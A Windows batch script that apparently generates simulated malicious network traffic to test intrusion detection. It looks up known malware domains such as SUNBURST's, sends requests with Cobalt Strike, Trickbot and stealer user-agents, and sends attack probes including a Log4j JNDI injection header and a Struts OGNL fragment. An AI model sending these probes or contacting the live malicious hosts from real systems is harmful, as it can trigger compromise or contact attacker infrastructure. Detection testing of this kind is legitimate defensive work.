@echo off

echo Executing commands...

REM Command 1

echo Connecting to the Spyware FH Varient...

powershell -Command "Invoke-WebRequest -Uri 'http://207.189.189.230/command.php?t=1&id=' -Headers @{'Host'='207.189.189.230'; 'User-Agent'='Mozilla/5.0 (Windows NT)'} -Method GET"

REM Command 2

echo Connecting to the SUNBURTS Malware Backdoor...

powershell -Command "Invoke-WebRequest -Uri 'http://avsvmcloud.com' -Method GET"

REM Command 3

echo Connecting to the SUNBURST Malware Domain...

nslookup avsvmcloud.com

REM Command 4

echo Connecting to the SUNBURST Malware Domain...

nslookup websitetheme.com

REM Command 5

echo Connecting to the Xanthe Crypto Miner...

powershell -Command "Invoke-WebRequest -Uri 'http://example.com/files/fczyo' -Headers @{'User-Agent'='fczyo-cron/'} -Method GET"

REM Command 6

echo Connecting to the CobaltStrike(C2) Domain...

powershell -Command "Invoke-WebRequest -Uri 'http://example.com/' -Headers @{'User-Agent'='testCobalt Strike Beacon)'} -Method POST"

REM Command 7

echo Log4j attack ...

powershell -Command "Invoke-WebRequest -Uri 'http://example.com' -Headers @{'Accept-Language'='\${jndi:ldap://test.example.com:1207/lol}'} -Method GET"

REM Command 8

echo Attacking SAP NetWeaver Application Server...

powershell -Command "Invoke-WebRequest -Uri 'http://example.com/CTCWebService/CTCWebServiceBean' -Method GET"

REM Command 9

echo Template Injection attempt ...

powershell -Command "Invoke-WebRequest -Uri 'http://example.com/word/tpl/test?template=anexo' -Method GET"

REM Command 10

echo Attacking Apache Strust OGNL in Dynamic action

powershell -Command "Invoke-WebRequest -Uri 'http://example.com?id=%25%7b%23' -Method GET"

REM Command 11

echo Connecting to Trickbot C2 Communication

powershell -Command "Invoke-WebRequest -Uri 'http://example.com/56evcxv' -Method GET"

REM Command 12

echo Connecting to the Malware ErbiumStealer

powershell -Command "Invoke-WebRequest -Uri 'http://example.com/api/getBuild?type=x' -Headers @{'Host'='207.189.189.230'; 'User-Agent'='Erbium-UA-'} -Method GET"

REM Command 13

echo Connecting to Malware Lilith Stealer

powershell -Command "Invoke-WebRequest -Uri 'http://example.com/gate/01234567-89ab-cdef-0123-456789abcdef/getCommands' -Headers @{'User-Agent'='Lilith-Bot/xyxyxyxy'} -Method GET"

REM Command 14

echo Connecting to the Malware Lilith Stealer

powershell -Command "Invoke-WebRequest -Uri 'http://example.com/gate/getCommands' -Headers @{'User-Agent'='Lilith-Bot/xyxyxyxy'} -Method GET"

REM Command 15

echo Connecting to the Malware Data Exfilteration Domain

nslookup -query=A test.mycisco-helpdesk.ml

REM Command 16

echo Connecting to the Phishing Domain

nslookup linkedopports.com

REM Command 17

echo Connecting to the Malicious library payload delivery domain

nslookup -query=A python-release.com

echo All commands executed. 
